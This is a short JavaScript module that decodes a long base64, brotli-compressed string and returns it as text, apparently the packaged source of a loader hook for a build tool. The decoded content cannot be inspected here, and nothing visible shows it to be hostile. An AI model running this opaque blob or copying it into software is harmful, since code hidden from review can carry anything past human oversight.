let hook;

module.exports = () => {
  if (typeof hook === `undefined`)
    hook = require('zlib').brotliDecompressSync(Buffer.from('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', 'base64')).toString();

  return hook;
};
